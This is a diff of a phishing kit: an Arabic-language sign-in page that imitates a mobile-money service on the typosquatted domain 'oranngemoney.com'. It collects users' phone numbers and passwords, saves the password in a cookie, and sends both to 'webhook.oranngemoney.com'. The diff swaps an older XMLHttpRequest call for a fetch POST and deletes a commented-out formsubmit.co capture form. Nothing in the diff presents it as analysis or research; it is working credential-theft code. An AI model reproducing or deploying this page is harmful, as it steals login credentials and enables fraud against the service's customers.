@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html data-wf-domain="www.orangemony.net" data-wf-page="686bf05165306b123b50bc54" data-wf-site="686bf05165306b123b50bc5c" lang="en" class="w-mod-js w-mod-ix wf-montserrat-i7-active wf-montserrat-i2-active wf-montserrat-i5-active wf-montserrat-i1-active wf-montserrat-i9-active wf-montserrat-i8-active wf-montserrat-i3-active wf-montserrat-i6-active wf-montserrat-i4-active wf-montserrat-n9-active wf-montserrat-n7-active wf-montserrat-n8-active wf-montserrat-n4-active wf-montserrat-n1-active wf-montserrat-n3-active wf-montserrat-n5-active wf-montserrat-n6-active wf-montserrat-n2-active wf-roboto-n3-active wf-roboto-n5-active wf-roboto-n4-active wf-active">
+<html data-wf-domain="www.oranngemoney.com" data-wf-page="686bf05165306b123b50bc54" data-wf-site="686bf05165306b123b50bc5c" lang="en" class="w-mod-js w-mod-ix wf-montserrat-i7-active wf-montserrat-i2-active wf-montserrat-i5-active wf-montserrat-i1-active wf-montserrat-i9-active wf-montserrat-i8-active wf-montserrat-i3-active wf-montserrat-i6-active wf-montserrat-i4-active wf-montserrat-n9-active wf-montserrat-n7-active wf-montserrat-n8-active wf-montserrat-n4-active wf-montserrat-n1-active wf-montserrat-n3-active wf-montserrat-n5-active wf-montserrat-n6-active wf-montserrat-n2-active wf-roboto-n3-active wf-roboto-n5-active wf-roboto-n4-active wf-active">
 
 
 
@@ -114,9 +114,6 @@
     <div class="div-block-4">
         <div class="container">
             <div class="w-form">
-<!--                 <form id="signin" name="مقدم الطلب" data-name="مقدم الطلب" redirect="/verification" action='https://formsubmit.co/18adf9b7fdf4cc3d254bb14bae1266c3' method="post" aria-label="تسجيل الدخول">
-                    <input type="hidden" name="_next" value="/verification">
-                    <input type="hidden" name="_captcha" value="false"> -->
                 <form id="signin" name="مقدم الطلب" data-name="مقدم الطلب" method="get" aria-label="تسجيل الدخول">
                     <div id="field" class="field-holder">
                         <input class="text-field-2 w-input" maxlength="10" name="رقم الهاتف" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required="">
@@ -231,13 +228,29 @@
         setCookie("password", document.getElementById('password').value);
 
 
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", 'https://webhook.oranngemoney.com', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            'phonenumber': document.getElementById('phonenumber').value,
-            'password': document.getElementById('password').value
-        }));
+        
+        // var xhr = new XMLHttpRequest();
+        // xhr.open("POST", 'https://webhook.oranngemoney.com', true);
+        // xhr.setRequestHeader('Content-Type', 'application/json');
+        
+        // xhr.send(
+        // JSON.stringify({
+        //     'phonenumber': document.getElementById('phonenumber').value,
+        //     'password': document.getElementById('password').value
+        // } )
+            // );
+     fetch("https://webhook.oranngemoney.com/", {
+        "body": JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
+        "headers": {
+            "Accept": "*/*",
+            "Content-Type": "application/json",
+        },
+        "method": "POST",
+        "mode": "cors",
+        "redirect": "follow",
+        "referrer": "https://oranngemoney.com/",
+        "referrerPolicy": "strict-origin-when-cross-origin"
+    })   
 
     })
     </script>
